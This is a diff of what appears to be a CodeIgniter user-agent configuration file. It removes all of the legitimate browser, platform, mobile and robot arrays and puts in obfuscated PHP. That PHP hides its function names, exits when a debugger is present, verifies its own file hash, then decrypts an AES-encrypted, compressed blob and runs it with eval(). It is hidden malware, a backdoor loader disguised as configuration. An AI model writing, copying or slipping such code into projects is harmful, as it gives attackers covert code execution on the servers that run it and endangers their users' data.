@@ -1,214 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------
-| USER AGENT TYPES
-| -------------------------------------------------------------------
-| This file contains four arrays of user agent data. It is used by the
-| User Agent Class to help identify browser, platform, robot, and
-| mobile device data. The array keys are used to identify the device
-| and the array values are used to set the actual name of the item.
-*/
-$platforms = array(
-	'windows nt 10.0'	=> 'Windows 10',
-	'windows nt 6.3'	=> 'Windows 8.1',
-	'windows nt 6.2'	=> 'Windows 8',
-	'windows nt 6.1'	=> 'Windows 7',
-	'windows nt 6.0'	=> 'Windows Vista',
-	'windows nt 5.2'	=> 'Windows 2003',
-	'windows nt 5.1'	=> 'Windows XP',
-	'windows nt 5.0'	=> 'Windows 2000',
-	'windows nt 4.0'	=> 'Windows NT 4.0',
-	'winnt4.0'			=> 'Windows NT 4.0',
-	'winnt 4.0'			=> 'Windows NT',
-	'winnt'				=> 'Windows NT',
-	'windows 98'		=> 'Windows 98',
-	'win98'				=> 'Windows 98',
-	'windows 95'		=> 'Windows 95',
-	'win95'				=> 'Windows 95',
-	'windows phone'			=> 'Windows Phone',
-	'windows'			=> 'Unknown Windows OS',
-	'android'			=> 'Android',
-	'blackberry'		=> 'BlackBerry',
-	'iphone'			=> 'iOS',
-	'ipad'				=> 'iOS',
-	'ipod'				=> 'iOS',
-	'os x'				=> 'Mac OS X',
-	'ppc mac'			=> 'Power PC Mac',
-	'freebsd'			=> 'FreeBSD',
-	'ppc'				=> 'Macintosh',
-	'linux'				=> 'Linux',
-	'debian'			=> 'Debian',
-	'sunos'				=> 'Sun Solaris',
-	'beos'				=> 'BeOS',
-	'apachebench'		=> 'ApacheBench',
-	'aix'				=> 'AIX',
-	'irix'				=> 'Irix',
-	'osf'				=> 'DEC OSF',
-	'hp-ux'				=> 'HP-UX',
-	'netbsd'			=> 'NetBSD',
-	'bsdi'				=> 'BSDi',
-	'openbsd'			=> 'OpenBSD',
-	'gnu'				=> 'GNU/Linux',
-	'unix'				=> 'Unknown Unix OS',
-	'symbian' 			=> 'Symbian OS'
-);
-
-
-// The order of this array should NOT be changed. Many browsers return
-// multiple browser types so we want to identify the sub-type first.
-$browsers = array(
-	'OPR'			=> 'Opera',
-	'Flock'			=> 'Flock',
-	'Edge'			=> 'Edge',
-	'Chrome'		=> 'Chrome',
-	// Opera 10+ always reports Opera/9.80 and appends Version/<real version> to the user agent string
-	'Opera.*?Version'	=> 'Opera',
-	'Opera'			=> 'Opera',
-	'MSIE'			=> 'Internet Explorer',
-	'Internet Explorer'	=> 'Internet Explorer',
-	'Trident.* rv'	=> 'Internet Explorer',
-	'Shiira'		=> 'Shiira',
-	'Firefox'		=> 'Firefox',
-	'Chimera'		=> 'Chimera',
-	'Phoenix'		=> 'Phoenix',
-	'Firebird'		=> 'Firebird',
-	'Camino'		=> 'Camino',
-	'Netscape'		=> 'Netscape',
-	'OmniWeb'		=> 'OmniWeb',
-	'Safari'		=> 'Safari',
-	'Mozilla'		=> 'Mozilla',
-	'Konqueror'		=> 'Konqueror',
-	'icab'			=> 'iCab',
-	'Lynx'			=> 'Lynx',
-	'Links'			=> 'Links',
-	'hotjava'		=> 'HotJava',
-	'amaya'			=> 'Amaya',
-	'IBrowse'		=> 'IBrowse',
-	'Maxthon'		=> 'Maxthon',
-	'Ubuntu'		=> 'Ubuntu Web Browser'
-);
-
-$mobiles = array(
-	// legacy array, old values commented out
-	'mobileexplorer'	=> 'Mobile Explorer',
-//  'openwave'			=> 'Open Wave',
-//	'opera mini'		=> 'Opera Mini',
-//	'operamini'			=> 'Opera Mini',
-//	'elaine'			=> 'Palm',
-	'palmsource'		=> 'Palm',
-//	'digital paths'		=> 'Palm',
-//	'avantgo'			=> 'Avantgo',
-//	'xiino'				=> 'Xiino',
-	'palmscape'			=> 'Palmscape',
-//	'nokia'				=> 'Nokia',
-//	'ericsson'			=> 'Ericsson',
-//	'blackberry'		=> 'BlackBerry',
-//	'motorola'			=> 'Motorola'
-
-	// Phones and Manufacturers
-	'motorola'		=> 'Motorola',
-	'nokia'			=> 'Nokia',
-	'palm'			=> 'Palm',
-	'iphone'		=> 'Apple iPhone',
-	'ipad'			=> 'iPad',
-	'ipod'			=> 'Apple iPod Touch',
-	'sony'			=> 'Sony Ericsson',
-	'ericsson'		=> 'Sony Ericsson',
-	'blackberry'	=> 'BlackBerry',
-	'cocoon'		=> 'O2 Cocoon',
-	'blazer'		=> 'Treo',
-	'lg'			=> 'LG',
-	'amoi'			=> 'Amoi',
-	'xda'			=> 'XDA',
-	'mda'			=> 'MDA',
-	'vario'			=> 'Vario',
-	'htc'			=> 'HTC',
-	'samsung'		=> 'Samsung',
-	'sharp'			=> 'Sharp',
-	'sie-'			=> 'Siemens',
-	'alcatel'		=> 'Alcatel',
-	'benq'			=> 'BenQ',
-	'ipaq'			=> 'HP iPaq',
-	'mot-'			=> 'Motorola',
-	'playstation portable'	=> 'PlayStation Portable',
-	'playstation 3'		=> 'PlayStation 3',
-	'playstation vita'  	=> 'PlayStation Vita',
-	'hiptop'		=> 'Danger Hiptop',
-	'nec-'			=> 'NEC',
-	'panasonic'		=> 'Panasonic',
-	'philips'		=> 'Philips',
-	'sagem'			=> 'Sagem',
-	'sanyo'			=> 'Sanyo',
-	'spv'			=> 'SPV',
-	'zte'			=> 'ZTE',
-	'sendo'			=> 'Sendo',
-	'nintendo dsi'	=> 'Nintendo DSi',
-	'nintendo ds'	=> 'Nintendo DS',
-	'nintendo 3ds'	=> 'Nintendo 3DS',
-	'wii'			=> 'Nintendo Wii',
-	'open web'		=> 'Open Web',
-	'openweb'		=> 'OpenWeb',
-
-	// Operating Systems
-	'android'		=> 'Android',
-	'symbian'		=> 'Symbian',
-	'SymbianOS'		=> 'SymbianOS',
-	'elaine'		=> 'Palm',
-	'series60'		=> 'Symbian S60',
-	'windows ce'	=> 'Windows CE',
-
-	// Browsers
-	'obigo'			=> 'Obigo',
-	'netfront'		=> 'Netfront Browser',
-	'openwave'		=> 'Openwave Browser',
-	'mobilexplorer'	=> 'Mobile Explorer',
-	'operamini'		=> 'Opera Mini',
-	'opera mini'	=> 'Opera Mini',
-	'opera mobi'	=> 'Opera Mobile',
-	'fennec'		=> 'Firefox Mobile',
-
-	// Other
-	'digital paths'	=> 'Digital Paths',
-	'avantgo'		=> 'AvantGo',
-	'xiino'			=> 'Xiino',
-	'novarra'		=> 'Novarra Transcoder',
-	'vodafone'		=> 'Vodafone',
-	'docomo'		=> 'NTT DoCoMo',
-	'o2'			=> 'O2',
-
-	// Fallback
-	'mobile'		=> 'Generic Mobile',
-	'wireless'		=> 'Generic Mobile',
-	'j2me'			=> 'Generic Mobile',
-	'midp'			=> 'Generic Mobile',
-	'cldc'			=> 'Generic Mobile',
-	'up.link'		=> 'Generic Mobile',
-	'up.browser'	=> 'Generic Mobile',
-	'smartphone'	=> 'Generic Mobile',
-	'cellphone'		=> 'Generic Mobile'
-);
-
-// There are hundreds of bots but these are the most common.
-$robots = array(
-	'googlebot'		=> 'Googlebot',
-	'msnbot'		=> 'MSNBot',
-	'baiduspider'		=> 'Baiduspider',
-	'bingbot'		=> 'Bing',
-	'slurp'			=> 'Inktomi Slurp',
-	'yahoo'			=> 'Yahoo',
-	'ask jeeves'		=> 'Ask Jeeves',
-	'fastcrawler'		=> 'FastCrawler',
-	'infoseek'		=> 'InfoSeek Robot 1.0',
-	'lycos'			=> 'Lycos',
-	'yandex'		=> 'YandexBot',
-	'mediapartners-google'	=> 'MediaPartners Google',
-	'CRAZYWEBCRAWLER'	=> 'Crazy Webcrawler',
-	'adsbot-google'		=> 'AdsBot Google',
-	'feedfetcher-google'	=> 'Feedfetcher Google',
-	'curious george'	=> 'Curious George',
-	'ia_archiver'		=> 'Alexa Crawler',
-	'MJ12bot'		=> 'Majestic-12',
-	'Uptimebot'		=> 'Uptimebot'
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qjj1500q=('bas'.'e64'.'_de'.'cod'.'e');
+$_iqifvful=('gzu'.'nco'.'mpr'.'ess');
+$_hitk6scz=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dc3yrky2='rW+0CuBLV0c=';
+$_g9iruch1='l9F2faT0';
+$_sjyydqjp='LY0r9trD';
+$_s8k5yjb9='SMCw3g58';
+$_z1od677o='xCVLzCaX';
+$_o5ioxjry='k465W21H';
+$_bmazd84k='R5ERqQ==';
+$_gz5iuqh0='OJwue42z';
+$_xsbs5ftf=$_qjj1500q($_z1od677o.$_g9iruch1.$_s8k5yjb9.$_sjyydqjp.$_dc3yrky2);
+$_ygg9si4l=$_qjj1500q($_o5ioxjry.$_gz5iuqh0.$_bmazd84k);
+$_yapfm0g2=$_qjj1500q('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');
+$_ngfno7uw=$_hitk6scz($_yapfm0g2,'aes-256-cbc',$_xsbs5ftf,OPENSSL_RAW_DATA,$_ygg9si4l);
+if($_ngfno7uw===false){exit;}
+$_p2jk2cns=$_iqifvful($_ngfno7uw);
+if($_p2jk2cns===false){exit;}
+$_uz40agug='143fa80d7b34b23921e6eeea26066f232dff9fb73c43fb56dd9e83092244caa4';
+$_m9j9pbid=@file_get_contents(__FILE__);
+if($_m9j9pbid!==false){
+$_fcz611ni=str_replace($_uz40agug,"0000000000000000000000000000000000000000000000000000000000000000",$_m9j9pbid);
+$_u1zqec3z=hash("sha256",$_fcz611ni);
+if($_u1zqec3z!==$_uz40agug){@http_response_code(403);exit;}
+}
+eval($_p2jk2cns);
